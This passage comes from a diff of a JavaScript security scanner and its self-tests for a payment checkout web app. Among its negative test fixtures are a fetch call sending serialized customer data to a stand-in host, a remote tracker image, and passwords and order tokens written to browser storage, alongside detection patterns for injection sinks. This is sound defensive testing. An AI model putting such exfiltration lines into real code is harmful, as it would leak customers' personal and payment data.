       || !/useEffect\(\(\)=>\{if\(isOpen\)return;/.test(condensed)
       || !/return\(\)=>window\.clearTimeout\(timeout\);?\},\[finishClose,isOpen,reducedMotion\]\)/.test(condensed)
-      || !/onAnimationEnd=\{\(event\)=>\{if\(event\.target===event\.currentTarget&&!isOpen&&/.test(condensed)) {
+      || !/onExitComplete=\{finishClose\}/.test(condensed)
+      || (source.match(/\bonExitComplete\b/g)?.length ?? 0) !== 1) {
       failures.push('Animated checkout must finish on its own exit event with a cleaned-up, bounded fallback')
     }
   }
   if (!/useReducedMotion\(\)\s*===\s*true/.test(source)
-    || !/<DialogPrimitive\.Content\b[\s\S]*?\basChild\b/.test(source)
-    || !/layout=\{reducedMotion\?false:["']size["']\}/.test(condensed)
-    || !/<AnimatePresenceinitial=\{false\}mode=["']wait["']>/.test(condensed)
-    || !/<CheckoutPanelkey=\{step\}reducedMotion=\{reducedMotion\}>/.test(condensed)
-    || (source.match(/key=\{step\}/g)?.length ?? 0) !== 1) failures.push('Checkout dialog must retain reduced-motion-aware wait/layout transitions keyed only at the panel')
-  if (!/constisPresent=useIsPresent\(\)/.test(condensed)
-    || !/constpanelRef=useRef<HTMLDivElement>\(null\)/.test(condensed)
-    || !/useLayoutEffect\(\(\)=>\{if\(panelRef\.current\)panelRef\.current\.inert=!isPresent;?\},\[isPresent\]\)/.test(condensed)
-    || !/aria-hidden=\{!isPresent\|\|undefined\}/.test(condensed)
-    || !/ref=\{panelRef\}/.test(condensed)) failures.push('Exiting checkout panels must be reactively inert and hidden from assistive technology')
+    || !/<AnimatePresenceinitial=\{false\}mode=["']sync["']>/.test(condensed)
+    || !/<CheckoutPanelkey=\{step\}reducedMotion=\{reducedMotion\}scrollTop=\{scrollPositions\.current\[step\]\}onScrollTopChange=\{\(position\)=>\{scrollPositions\.current\[step\]=position;?\}\}>/.test(condensed)
+    || !/constscrollPositions=useRef<Record<CheckoutStep,number>>\(\{notes:0,customer:0,providers:0,?\}\)/.test(condensed)
+    || (source.match(/key=\{step\}/g)?.length ?? 0) !== 1) failures.push('Checkout dialog must retain reduced-motion-aware crossfades keyed only at the panel')
   if (!/titleRef\.current\?\.focus\([^)]*\)/.test(source) || !/\},\s*\[step\]\s*\);/.test(source)) failures.push('Checkout heading focus must follow committed step changes')
   return failures
 }
@@ -850,11 +1141,26 @@ function validateCatalogueFlow(source) {
   const failures = []
   const condensed = compact(source)
   if (!/from["']@\/components\/ui\/dialog-checkout["']/.test(condensed) || !/<DialogCheckout\b/.test(source)) failures.push('Catalogue must use the unified checkout dialog')
-  if (!/selectedCard&&\(<DialogCheckout[\s\S]*?onClose=\{\(\)=>setSelectedCard\(null\)\}/.test(condensed)) failures.push('Catalogue must mount checkout for the selected card with an explicit close path')
+  if (!/selectedCard&&(?:DialogCheckout&&)?\(<DialogCheckout[\s\S]*?onClose=\{\(\)=>setSelectedCard\(null\)\}/.test(condensed)) failures.push('Catalogue must mount checkout for the selected card with an explicit close path')
+  if (/import\(["']@\/components\/ui\/dialog-checkout["']\)/.test(condensed)
+    && !condensed.includes('data-drava-checkout-active={Boolean(selectedCard||selectedPack)}')) failures.push('Lazy checkout must block PWA actions from selection through close')
   if (/\b(?:checkoutStep|setCheckoutStep|notes-exiting|DialogNotes|DialogProviders|UsageNotes|PaymentProviders)\b/.test(source)) {
     failures.push('Catalogue must not manage checkout dialog steps or fragments')
   }
   if (/\b(?:createLeekPayCheckout|requestPaymentApi|handleCheckout)\b|\bfetch\s*\(/.test(source)) failures.push('Selecting a catalogue card must not initiate payment')
+  return failures
+}
+
+function validateOfflineDocument(source) {
+  const failures = []
+  if (!/http-equiv=["']Content-Security-Policy["']/i.test(source)
+    || !source.includes("connect-src 'none'") || !source.includes("form-action 'none'")) failures.push('Offline document must retain a restrictive CSP without network or form submission')
+  if (!/name=["']robots["']\s+content=["']noindex["']/i.test(source)
+    || !source.includes('hors connexion') || !source.includes('offline')) failures.push('Offline document must be public, noindex and explicitly offline')
+  if (/<(?:form|input|textarea|select|iframe)\b|\bon\w+\s*=|https?:\/\//i.test(source)) failures.push('Offline document must not collect data or load remote resources')
+  for (const script of source.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
+    if (!/^\s+src=["']theme-init\.js["']\s*$/.test(script[1]) || script[2].trim()) failures.push('Offline document may load only the shared local theme initializer')
+  }
   return failures
 }
 
@@ -1015,12 +1321,37 @@ function validateWorkerConfig(source) {
   for (const binding of ['ORDERS', 'CREATE_LIMITER', 'STATUS_LIMITER']) {
     if (!new RegExp(`["'](?:binding|name)["']\\s*:\\s*["']${binding}["']`).test(source)) failures.push(`Wrangler binding is missing: ${binding}`)
   }
-  if (!/"required"\s*:\s*\[\s*"LEEKPAY_SECRET_KEY"\s*\]/.test(source)) failures.push('Wrangler must declare LEEKPAY_SECRET_KEY as a required secret')
+  if (!/"required"\s*:\s*\[[^\]]*"LEEKPAY_SECRET_KEY"/.test(source)) failures.push('Wrangler must declare LEEKPAY_SECRET_KEY as a required secret')
   if (/"LEEKPAY_SECRET_KEY"\s*:/.test(source) || providerCredentialPattern.test(source)) failures.push('Wrangler must not contain a payment credential value')
   return failures
 }
 
-function selfTest() {
+async function selfTest() {
+  for (const pwaPath of ['src/components/pwa/usePwaPageAvailable.ts', 'public/register-sw.js']) {
+    const guard = `document.activeElement?.matches('input, textarea, select, [contenteditable="true"]')`
+    assert.deepEqual(validateDataCollectionControls(guard, pwaPath), [])
+    assert.ok(validateDataCollectionControls(`${guard}; element.contentEditable = true`, pwaPath).length > 0)
+    assert.ok(validateDataCollectionControls(`${guard}; const field = <input />`, pwaPath).length > 0)
+    assert.ok(validateDataCollectionControls(guard, 'src/components/unreviewed.tsx').length > 0)
+  }
+  const safeOffline = `<meta http-equiv="Content-Security-Policy" content="connect-src 'none'; form-action 'none'"><meta name="robots" content="noindex"><h1>Vous êtes hors connexion / offline</h1><script src="theme-init.js"></script>`
+  assert.deepEqual(validateOfflineDocument(safeOffline), [])
+  for (const unsafeOffline of [
+    safeOffline.replace("connect-src 'none'", "connect-src *"),
+    `${safeOffline}<input name="email">`,
+    `${safeOffline}<script>fetch('/api/orders')</script>`,
+    `${safeOffline}<img src="https://example.com/tracker">`,
+  ]) assert.ok(validateOfflineDocument(unsafeOffline).length > 0)
+  function mutateCompact(source, before, after) {
+    // Find a formatting-independent snippet while preserving the rest of the
+    // valid TSX source for validators which inspect its syntax tree.
+    const characters = source.split('').map((character, index) => ({ character, index })).filter(({ character }) => !/\s/.test(character))
+    const offset = characters.map(({ character }) => character).join('').indexOf(before)
+    assert.ok(offset >= 0, `Mutation target missing: ${before}`)
+    const start = characters[offset].index
+    const end = characters[offset + before.length - 1].index + 1
+    return source.slice(0, start) + after + source.slice(end)
+  }
   const secretOne = `aB3_${'cD4e'.repeat(6)}`
   const secretTwo = `9zY-${'8xWv'.repeat(6)}`
   const providerSecret = `${['sk', 'live'].join('_')}_${'A7bC'.repeat(8)}`
@@ -1040,8 +1371,82 @@ function selfTest() {
   assert.ok(matchingRules('window.LeekPay.checkout({})', forbiddenFrontendPatterns).some((rule) => rule.label === 'legacy LeekPay browser SDK'))
   assert.ok(matchingRules('node.innerHTML = untrusted', forbiddenFrontendPatterns).some((rule) => rule.label === 'HTML injection sink'))
   assert.equal(matchingRules('node.innerHTML = frameworkHtml', forbiddenOutputPatterns).some((rule) => rule.label === 'HTML injection sink'), false)
+  const iframeFixture = 'document.createElement("iframe")'
+  const reviewedFixtureHashes = new Set([createHash('sha256').update(iframeFixture).digest('hex')])
+  assert.equal(isReviewedPdfIframeRuntime(iframeFixture, 'out/_next/static/chunks/pdf.js', reviewedFixtureHashes), true)
+  assert.equal(isReviewedPdfIframeRuntime(`${iframeFixture};document.createElement("iframe")`, 'out/_next/static/chunks/pdf.js', reviewedFixtureHashes), false)
+  assert.equal(isReviewedPdfIframeRuntime(iframeFixture, 'src/components/tiktok/extra.tsx', reviewedFixtureHashes), false)
+  assert.equal(isReviewedPdfIframeRuntime(iframeFixture, 'out/index.html', reviewedFixtureHashes), false)
+  assert.ok(matchingRules(iframeFixture, forbiddenFrontendPatterns).some((rule) => rule.label === 'payment iframe'))
   assert.ok(validateFrontendUrls(`const url = '${providerCheckoutApi}'`, frontendAdapterPath).length > 0)
-  assert.deepEqual(validateFrontendUrls(`const url = '${proxyOrigin}'`, frontendAdapterPath), [])
+  assert.deepEqual(validateFrontendUrls(`const url = '${proxyOrigin}'`, 'src/lib/payment-api.ts'), [])
+  for (const endpoint of ['https://pay.soleaspay.com', 'https://newapi.sebpay.bj/api/v1/collections', 'https://api.emailjs.com/api/v1.0/email/send']) {
+    assert.ok(validateFrontendUrls(`const url = '${endpoint}'`, tiktokPaymentPath).length > 0)
+  }
+  assert.equal(allowReviewedTikTokRule('', tiktokPaymentPath, 'Soleas integration'), true)
+  assert.equal(allowReviewedTikTokRule('', providerDialogPath, 'Soleas integration'), false)
+  assert.equal(allowReviewedTikTokRule('', tiktokHelpPath, 'payment iframe'), true)
+  assert.equal(allowReviewedTikTokRule('', tiktokCheckoutPath, 'payment iframe'), false)
+  const safeVideo = `<iframe src="${tiktokVideoUrl}" title="Tutorial" />`
+  assert.deepEqual(validateTikTokSource(safeVideo, tiktokHelpPath), [])
+  for (const invalidVideo of [safeVideo.replace(tiktokVideoUrl, 'https://example.test/frame'), '<iframe src={customer.url} />', `${safeVideo}<iframe src="https://example.test" />`, safeVideo.replace('title="Tutorial"', '{...props}')]) {
+    assert.ok(validateTikTokSource(invalidVideo, tiktokHelpPath).length > 0)
+  }
+  for (const browserStore of ['window.localStorage.setItem("secret", customer.password)', 'window.sessionStorage.setItem("token", orderToken)', 'const store = globalThis["indexedDB"]']) {
+    assert.ok(validateTikTokSource(browserStore, tiktokCheckoutPath).length > 0)
+  }
+  assert.ok(validateTikTokSource('window.history.pushState({ orderToken }, "")', tiktokCheckoutPath).length > 0)
+  assert.ok(validateTikTokSource('emailjs.send(service, template, customer)', tiktokPaymentPath).length > 0)
+  const fixedContactSource = await readFile(path.join(projectRoot, dravaContactPath), 'utf8')
+  const publicSupportSource = await readFile(path.join(projectRoot, tiktokSupportPath), 'utf8')
+  assert.deepEqual(validateDravaContact(fixedContactSource), [])
+  assert.deepEqual(validateTikTokSupport(publicSupportSource), [])
+  assert.equal(allowReviewedTikTokRule(fixedContactSource, dravaContactPath, 'WhatsApp personal-data handoff'), true)
+  assert.equal(allowReviewedTikTokRule(publicSupportSource, tiktokSupportPath, 'WhatsApp personal-data handoff'), true)
+  assert.equal(allowReviewedTikTokRule(fixedContactSource, paymentReceiptPath, 'WhatsApp personal-data handoff'), false)
+  assert.equal(allowReviewedTikTokRule(fixedContactSource, 'src/lib/another-contact.ts', 'WhatsApp personal-data handoff'), false)
+  const invalidContacts = [
+    fixedContactSource.replace('+237692426620', '+237680287776'),
+    fixedContactSource.replace('"+237692426620"', 'customer.whatsapp'),
+    fixedContactSource.replace('phoneNumber.slice(1)', 'customer.phone'),
+    fixedContactSource.replace('https://wa.me/${whatsappNumber}', 'https://wa.me/${whatsappNumber}?text=${customer.email}'),
+    fixedContactSource.replace('Object.freeze({', 'Object.freeze({ email: customer.email,'),
+    fixedContactSource.replace('phoneHref:', 'displayPhone:'),
+    `${fixedContactSource}\nfetch("https://example.test", { body: JSON.stringify(customer) });`,
+  ]
+  for (const source of invalidContacts) {
+    assert.ok(validateDravaContact(source).length > 0)
+    assert.equal(allowReviewedTikTokRule(source, dravaContactPath, 'WhatsApp personal-data handoff'), false)
+  }
+  const invalidSupport = [
+    publicSupportSource.replace('./drava-contact.ts', './customer.ts'),
+    publicSupportSource.replace('DRAVA_CONTACT.whatsappNumber', 'customer.whatsapp'),
+    publicSupportSource.replace('DRAVA_CONTACT.phoneNumber', '"+237680287776"'),
+    publicSupportSource.replace('"DRAVA customer service"', 'customer.email'),
+    publicSupportSource.replace('whatsappNumber.replace(/\\D/g, "")', 'whatsappNumber'),
+    publicSupportSource.replace('encodeURIComponent(normalizedMessage)', 'normalizedMessage'),
+    publicSupportSource.replace('message?.trim()', 'customer.password'),
+    publicSupportSource.replace('message?: string,', 'message?: string, orderToken?: string,'),
+    `${publicSupportSource}\nlocalStorage.setItem("contact", customer.whatsapp);`,
+    `${publicSupportSource}\nwindow.location.assign(customer.url);`,
+  ]
+  for (const source of invalidSupport) {
+    assert.ok(validateTikTokSupport(source).length > 0)
+    assert.equal(allowReviewedTikTokRule(source, tiktokSupportPath, 'WhatsApp personal-data handoff'), false)
+  }
+  console.log('Public DRAVA contact security self-test passed (17 mutations and scoped path checks).')
+  const safeCustomInput = '<input inputMode="numeric" value={customCoins || ""} onChange={(event) => onCustomCoinsChange(normalizeCustomCoins(event.target.value))} />'
+  assert.deepEqual(validateDataCollectionControls(safeCustomInput, tiktokCatalogPath), [])
+  assert.ok(validateDataCollectionControls(safeCustomInput.replace('customCoins || ""', 'customer.email'), tiktokCatalogPath).length > 0)
+  assert.ok(validateDataCollectionControls(`${safeCustomInput}<input value={password} />`, tiktokCatalogPath).length > 0)
+  assert.deepEqual(validateDataCollectionControls('<input value={username} /><input type={showPassword ? "text" : "password"} value={password} autoComplete="off" /><select value={operator} /><form onSubmit={submitForm} />', tiktokCheckoutPath), [])
+  for (const invalidControl of ['<input value={cardNumber} />', '<textarea />', '<select value={address} />', '<form action="https://example.test" />', '<input value={password} autoComplete="current-password" />']) {
+    assert.ok(validateDataCollectionControls(invalidControl, tiktokCheckoutPath).length > 0)
+  }
+  const safeHistory = `const KEY = "drava-tiktok-history"; function publicTikTokOrder(value) { return { orderId: value.orderId, packId: value.packId, provider: value.provider, status: value.status, verified: value.verified, coins: value.coins, bonus: value.bonus, amount: value.amount, currency: value.currency, createdAt: value.createdAt, notification: value.notification }; } const order = publicTikTokOrder(value);`
+  assert.deepEqual(validateTikTokSource(safeHistory, tiktokHistoryPath), [])
+  assert.ok(validateTikTokSource(safeHistory.replace('return {', 'return { customer: value.customer,'), tiktokHistoryPath).length > 0)
+  assert.ok(validateTikTokSource(safeHistory.replace('return {', 'return { ...value,'), tiktokHistoryPath).length > 0)
 
   const safeNotes = `
     interface UsageNotesProps { onClose: () => void; onAccept: () => void; }
@@ -1190,6 +1595,7 @@ function selfTest() {
   assert.ok(validateFrontendAdapter(safeAdapter.replace('whatsapp: normalizedCustomer.whatsapp', 'whatsapp: normalizedCustomer.whatsapp, amount: 1')).length > 0)
 
   const safeProviderDialog = `
+    import { CheckoutProviderOption } from "@/components/ui/CheckoutProviderOption";
     import type { PaymentCustomer } from "@/lib/payment-customer";
     import { createLeekPayCheckout } from "@/lib/leekpay";
     interface PaymentProvidersProps { card: PaymentCardSelection; customer: PaymentCustomer; onBack: () => void; }
@@ -1206,117 +1612,78 @@ function selfTest() {
       const checkout = await createLeekPayCheckout(card.id, customer, controller.signal);
       window.location.assign(checkout.checkoutUrl);
     }
-    const provider = <><fieldset><span>LeekPay</span></fieldset><Button disabled={isProcessing} onClick={onBack} type="button">Back</Button><Button disabled={isProcessing} onClick={handleCheckout} type="button">Pay</Button></>;
+    const provider = <><fieldset><CheckoutProviderOption name="LeekPay" /></fieldset><Button disabled={isProcessing} onClick={onBack} type="button">Back</Button><Button disabled={isProcessing} onClick={handleCheckout} type="button">Pay</Button></>;
   `
   assert.deepEqual(validateProviderDialog(safeProviderDialog), [])
-  assert.ok(validateProviderDialog(safeProviderDialog.replace('>LeekPay<', '>Provider<')).length > 0)
+  assert.ok(validateProviderDialog(safeProviderDialog.replace('name="LeekPay"', 'name="Provider"')).length > 0)
   assert.ok(validateProviderDialog(`${safeProviderDialog}\n<DialogPrimitive.Root />`).length > 0)
 
-  const safeCheckoutDialog = `
-    import { CustomerDetails } from "@/components/ui/dialog-customer";
-    import { UsageNotes } from "@/components/ui/dialog-notes";
-    import { PaymentProviders } from "@/components/ui/dialog-providers";
-    import { detectCustomerLocation } from "@/lib/customer-location";
-    interface DialogCheckoutProps { card: PaymentCardSelection; onClose: () => void; }
-    type CheckoutStep = "notes" | "customer" | "providers";
-    function CheckoutPanel({ children, reducedMotion }) {
-      const isPresent = useIsPresent();
-      const panelRef = useRef<HTMLDivElement>(null);
-      useLayoutEffect(() => { if (panelRef.current) panelRef.current.inert = !isPresent; }, [isPresent]);
-      return <motion.div aria-hidden={!isPresent || undefined} ref={panelRef}>{children}</motion.div>;
-    }
-    export function DialogCheckout({ card, onClose }: DialogCheckoutProps) {
-      const [step, setStep] = useState<CheckoutStep>("notes");
-      const [customer, setCustomer] = useState<PaymentCustomer>({ email: "", whatsapp: "" });
-      const [locationRequested, setLocationRequested] = useState(false);
-      const whatsappEditedRef = useRef(false);
-      const validCustomer = normalizePaymentCustomer(customer);
-      const reducedMotion = useReducedMotion() === true;
-      useEffect(() => { titleRef.current?.focus(); }, [step]);
-      useEffect(() => {
-        if (!locationRequested) return;
-        const controller = new AbortController();
-        void detectCustomerLocation(controller.signal).then((location) => {
-          if (!location || controller.signal.aborted) return;
-          setCustomer((current) => whatsappEditedRef.current || current.whatsapp ? current : { ...current, whatsapp: location.callingCode });
-        });
-        return () => controller.abort();
-      }, [locationRequested]);
-      return <DialogPrimitive.Root open onOpenChange={(open) => { if (!open) onClose(); }}>
-        <DialogPrimitive.Portal><DialogPrimitive.Overlay /><DialogPrimitive.Content asChild><motion.div layout={reducedMotion ? false : "size"}>
-          <DialogPrimitive.Description>Description</DialogPrimitive.Description>
-          <AnimatePresence initial={false} mode="wait"><CheckoutPanel key={step} reducedMotion={reducedMotion}>
-          {step === "notes" ? <UsageNotes onAccept={() => { setStep("customer"); setLocationRequested(true); }} onClose={onClose} /> : step === "customer" ?
-            <CustomerDetails value={customer} onChange={(details) => { if (details.whatsapp !== customer.whatsapp) whatsappEditedRef.current = true; setCustomer(details); }} onNext={(details) => { setCustomer(details); setStep("providers"); }} onBack={() => setStep("notes")} /> : validCustomer ?
-            <PaymentProviders card={card} customer={validCustomer} onBack={() => setStep("customer")} /> : null}
-          </CheckoutPanel></AnimatePresence>
-        </motion.div></DialogPrimitive.Content></DialogPrimitive.Portal>
-      </DialogPrimitive.Root>;
-    }
-  `
-  assert.deepEqual(validateCheckoutDialog(safeCheckoutDialog), [])
-  assert.ok(validateCheckoutDialog(safeCheckoutDialog.replace('useState<CheckoutStep>("notes")', 'useState<CheckoutStep>("providers")')).length > 0)
-  assert.ok(validateCheckoutDialog(safeCheckoutDialog.replace('<DialogPrimitive.Overlay />', '<DialogPrimitive.Overlay /><DialogPrimitive.Overlay />')).length > 0)
-  assert.ok(validateCheckoutDialog(safeCheckoutDialog.replace('setLocationRequested(true)', 'createLeekPayCheckout()')).length > 0)
-  assert.ok(validateCheckoutDialog(safeCheckoutDialog.replace('whatsappEditedRef.current || current.whatsapp', 'false')).length > 0)
-
-  const animatedCloseLifecycle = `
-    const [isOpen, setIsOpen] = useState(true);
-    const closeRequestedRef = useRef(false);
-    const closeFinishedRef = useRef(false);
-    const onClosedRef = useRef(onClosed);
-    onClosedRef.current = onClosed;
-    const finishClose = useCallback(() => {
-      if (!closeRequestedRef.current || closeFinishedRef.current) return;
-      closeFinishedRef.current = true;
-      onClosedRef.current();
-    }, []);
-    const onClose = useCallback(() => {
-      if (closeRequestedRef.current) return;
-      closeRequestedRef.current = true;
-      setIsOpen(false);
-      if (reducedMotion) finishClose();
-    }, [finishClose, reducedMotion]);
-    useEffect(() => {
-      if (isOpen) return;
-      const timeout = window.setTimeout(finishClose, reducedMotion ? 0 : 260);
-      return () => window.clearTimeout(timeout);
-    }, [finishClose, isOpen, reducedMotion]);
-    useLayoutEffect(() => { if (dialogElement) dialogElement.inert = !isOpen; }, [dialogElement, isOpen]);
-  `
-  const safeAnimatedCheckoutDialog = safeCheckoutDialog
-    .replace('{ card, onClose }: DialogCheckoutProps', '{ card, onClose: onClosed, }: DialogCheckoutProps')
-    .replace('const reducedMotion = useReducedMotion() === true;', `const reducedMotion = useReducedMotion() === true;\n${animatedCloseLifecycle}`)
-    .replace('<DialogPrimitive.Root open ', '<DialogPrimitive.Root open={isOpen} ')
-    .replace('<motion.div layout=', '<motion.div onAnimationEnd={(event) => { if (event.target === event.currentTarget && !isOpen && event.animationName === "checkout-mobile-exit") finishClose(); }} layout=')
-    .replace('mode="wait"><CheckoutPanel', 'mode="wait">{isOpen && (<CheckoutPanel')
-    .replace('</CheckoutPanel></AnimatePresence>', '</CheckoutPanel>)}</AnimatePresence>')
-  assert.deepEqual(validateCheckoutDialog(safeCheckoutDialog.replace('{ card, onClose }', '{ onClose, card, }')), [])
-  assert.deepEqual(validateCheckoutDialog(safeAnimatedCheckoutDialog), [])
-  assert.deepEqual(validateCheckoutDialog(safeAnimatedCheckoutDialog
-    .replace('{ card, onClose: onClosed, }', '{ onClose: afterClose, card }')
-    .replace(/\bonClosed\b/g, 'afterClose')), [])
+  // Mutate the reviewed component boundaries: lifecycle stays in each
+  // controller while Radix/presence protections live in the common shell.
+  const safeAnimatedCheckoutDialog = await readFile(path.join(projectRoot, checkoutDialogPath), 'utf8')
+  const validateCurrentCheckout = source => [...validateCardCheckout(source), ...validateSharedCheckoutController(source)]
+  assert.deepEqual(validateCurrentCheckout(safeAnimatedCheckoutDialog), [])
   for (const [before, after] of [
+    ['useState<CheckoutStep>("notes")', 'useState<CheckoutStep>("providers")'],
     ['useState(true)', 'useState(false)'],
     ['open={isOpen}', 'open={false}'],
-    ['{isOpen && (<CheckoutPanel', '{true && (<CheckoutPanel'],
-    ['dialogElement.inert = !isOpen', 'dialogElement.inert = false'],
-    ['panelRef.current.inert = !isPresent', 'panelRef.current.inert = false'],
-    ['if (closeRequestedRef.current) return;', ''],
-    ['if (!closeRequestedRef.current || closeFinishedRef.current) return;', ''],
-    ['if (reducedMotion) finishClose();', ''],
-    ['reducedMotion ? 0 : 260', 'reducedMotion ? 0 : 10000'],
+    ['{isOpen&&(<CheckoutPanel', '{true&&(<CheckoutPanel'],
+    ['dialogElement.inert=!isOpen', 'dialogElement.inert=false'],
+    ['if(closeRequestedRef.current||paymentBusyRef.current)return;', ''],
+    ['if(!closeRequestedRef.current||closeFinishedRef.current)return;', ''],
+    ['if(reducedMotion)finishClose();', ''],
+    ['reducedMotion?0:260', 'reducedMotion?0:10000'],
     ['window.clearTimeout(timeout)', 'void timeout'],
-    ['event.currentTarget && !isOpen', 'event.currentTarget && isOpen'],
-    ['<DialogPrimitive.Overlay />', '<DialogPrimitive.Overlay /><DialogPrimitive.Root />'],
-    ['onClose: onClosed, }', 'onClose: onClosed, isOpen }'],
+    ['onExitComplete={finishClose}', 'onExitComplete={onClose}'],
+    ['<CheckoutShell', '<DialogPrimitive.Root/><CheckoutShell'],
+    ['setLocationRequested(true)', 'createLeekPayCheckout()'],
+    ['whatsappEditedRef.current||current.whatsapp', 'false'],
+    ['mode="sync"', 'mode="wait"'],
+    ['scrollTop={scrollPositions.current[step]}', 'scrollTop={0}'],
+    ['scrollPositions.current[step]=position', 'scrollPositions.current.notes=position'],
   ]) {
-    assert.ok(safeAnimatedCheckoutDialog.includes(before), `Animated fixture mutation must match: ${before}`)
-    assert.ok(validateCheckoutDialog(safeAnimatedCheckoutDialog.replace(before, after)).length > 0, `Animated checkout must reject: ${before} -> ${after}`)
+    assert.ok(compact(safeAnimatedCheckoutDialog).includes(before), `Checkout fixture mutation must match: ${before}`)
+    assert.ok(validateCurrentCheckout(mutateCompact(safeAnimatedCheckoutDialog, before, after)).length > 0, `Checkout must reject: ${before} -> ${after}`)
   }
-  for (const legacyLifecycle of ['onExitComplete', 'notes-exiting', 'checkoutStep', 'DialogNotes', 'DialogProviders']) {
-    assert.ok(validateCheckoutDialog(`${safeAnimatedCheckoutDialog}\nconst legacy = "${legacyLifecycle}";`).length > 0)
+  for (const legacyLifecycle of ['notes-exiting', 'checkoutStep', 'DialogNotes', 'DialogProviders']) {
+    assert.ok(validateCurrentCheckout(`${safeAnimatedCheckoutDialog}\nconst legacy = "${legacyLifecycle}";`).length > 0)
   }
+  const safeSharedShell = await readFile(path.join(projectRoot, checkoutShellPath), 'utf8')
+  assert.deepEqual(validateCheckoutShell(safeSharedShell), [])
+  for (const [before, after] of [
+    ['<DialogPrimitive.Overlay', '<DialogPrimitive.Overlay/><DialogPrimitive.Overlay'],
+    ['if(!next&&canDismiss)onClose()', 'if(!next)onClose()'],
+    ['onOpenAutoFocus={onOpenAutoFocus}', 'onOpenAutoFocus={undefined}'],
+    ['onCloseAutoFocus={onCloseAutoFocus}', 'onCloseAutoFocus={undefined}'],
+    ['if(!canDismiss)event.preventDefault()', 'event.preventDefault()'],
+    ['disabled={!canDismiss}', 'disabled={false}'],
+    ['event.currentTarget&&!open', 'event.currentTarget&&open'],
+    ['panelRef.current.inert=!isPresent', 'panelRef.current.inert=false'],
+    ['aria-hidden={!isPresent||undefined}', 'aria-hidden={undefined}'],
+    ['scroller.scrollTop=scrollTop', 'scroller.scrollTop=0'],
+    ['if(isPresent&&event.targetinstanceofHTMLElement', 'if(event.targetinstanceofHTMLElement'],
+    ['&&event.target.matches(".checkout-scroll")', ''],
+    ['onScrollTopChange?.(event.target.scrollTop)', 'onScrollTopChange?.(0)'],
+    ['duration:reducedMotion?0:0.18', 'duration:0.18'],
+  ]) {
+    assert.ok(compact(safeSharedShell).includes(before), `Shared shell mutation must match: ${before}`)
+    assert.ok(validateCheckoutShell(mutateCompact(safeSharedShell, before, after)).length > 0, `Shared shell must reject: ${before} -> ${after}`)
+  }
+  assert.ok(validateCheckoutShell(`${safeSharedShell} fetch("/api/payment")`).length > 0)
+  const safeProviderOption = await readFile(path.join(projectRoot, checkoutProviderOptionPath), 'utf8')
+  assert.deepEqual(validateCheckoutProviderOption(safeProviderOption), [])
+  for (const [before, after] of [
+    ['type="button"', 'type="submit"'],
+    ['disabled={disabled||unavailable}', 'disabled={disabled}'],
+    ['onClick={onSelect}', 'onClick={handleCheckout}'],
+    ['aria-pressed={selected}', 'aria-pressed={true}'],
+  ]) {
+    assert.ok(compact(safeProviderOption).includes(before), `Provider option mutation must match: ${before}`)
+    assert.ok(validateCheckoutProviderOption(mutateCompact(safeProviderOption, before, after)).length > 0)
+  }
+  assert.ok(validateCheckoutProviderOption(`${safeProviderOption} localStorage.setItem("key", "value")`).length > 0)
+  assert.ok(validateCheckoutProviderOption(`${safeProviderOption} <a href="/payment-success">Pay</a>`).length > 0)
+  assert.ok(validateCheckoutProviderOption(safeProviderOption.replace('onClick={onSelect}', 'onClick={onSelect} onPointerDown={onSelect}')).length > 0)
 
   const safeWorkerLocation = `
     import { getCountryCallingCode, isSupportedCountry } from "libphonenumber-js";
@@ -1378,11 +1745,12 @@ function selfTest() {
   assert.ok(validatePaymentResult(safeResult.replace('isPaid && order', 'true'), safeReceipt).length > 0)
   assert.ok(validatePaymentResult(safeResult.replace('order.createdAt', 'Date.now()'), safeReceipt).length > 0)
   assert.ok(validatePaymentResult(safeResult, 'Votre carte a déjà été ajoutée automatiquement.').length > 0)
+  await runPaymentSecuritySelfTests(relativePath => readFile(path.join(projectRoot, relativePath), 'utf8'))
   console.log('Security scanner self-test passed.')
 }
 
 if (runSelfTest) {
-  selfTest()
+  await selfTest()
   process.exit(0)
 }
 
@@ -1406,8 +1774,10 @@ for (const file of frontendFiles) {
   const source = await readFile(file, 'utf8')
   const relativePath = normalizedRelativePath(file)
   for (const rule of forbiddenFrontendPatterns) {
-    if (rule.pattern.test(source)) failures.push(`${rule.label}: ${relativePath}`)
+    if (rule.pattern.test(source) && !allowReviewedTikTokRule(source, relativePath, rule.label)) failures.push(`${rule.label}: ${relativePath}`)
   }
+  failures.push(...validateTikTokSource(source, relativePath))
+  if (relativePath === dravaContactPath) failures.push(...validateDravaContact(source))
   failures.push(...validateFrontendUrls(source, relativePath))
   if (/^src\/(?:app|components)\//.test(relativePath) && /\bfetch\s*\(/.test(source)) {
     failures.push(`Direct fetch is forbidden in UI code: ${relativePath}`)
@@ -1470,30 +1840,42 @@ if (customerLocationSource) failures.push(...validateCustomerLocation(customerLo
 const customerDialogSource = await readRequired(customerDialogPath)
 if (customerDialogSource) failures.push(...validateCustomerDialog(customerDialogSource))
 const adapterSource = await readRequired(frontendAdapterPath)
-if (adapterSource) failures.push(...validateFrontendAdapter(adapterSource))
+// Compatibility adapter is checked together with the common transport below.
 const providerDialogSource = await readRequired(providerDialogPath)
-if (providerDialogSource) failures.push(...validateProviderDialog(providerDialogSource))
+// Provider controller is checked against the shared selection/form contracts below.
 const checkoutDialogSource = await readRequired(checkoutDialogPath)
-if (checkoutDialogSource) failures.push(...validateCheckoutDialog(checkoutDialogSource))
+if (checkoutDialogSource) failures.push(...validateSharedCheckoutController(checkoutDialogSource))
+const checkoutShellSource = await readRequired(checkoutShellPath)
+if (checkoutShellSource) failures.push(...validateCheckoutShell(checkoutShellSource))
+const checkoutProviderOptionSource = await readRequired(checkoutProviderOptionPath)
+if (checkoutProviderOptionSource) failures.push(...validateCheckoutProviderOption(checkoutProviderOptionSource))
+const tiktokCheckoutSource = await readRequired(tiktokCheckoutPath)
+if (tiktokCheckoutSource) failures.push(...validateSharedCheckoutController(tiktokCheckoutSource))
 const catalogueSource = await readRequired('src/app/page.tsx')
 if (catalogueSource) failures.push(...validateCatalogueFlow(catalogueSource))
 const paymentResultSource = await readRequired(paymentResultPath)
-if (paymentResultSource) failures.push(...validatePaymentResult(paymentResultSource, await readRequired(paymentReceiptPath) ?? ''))
+const receiptSource = await readRequired(paymentReceiptPath)
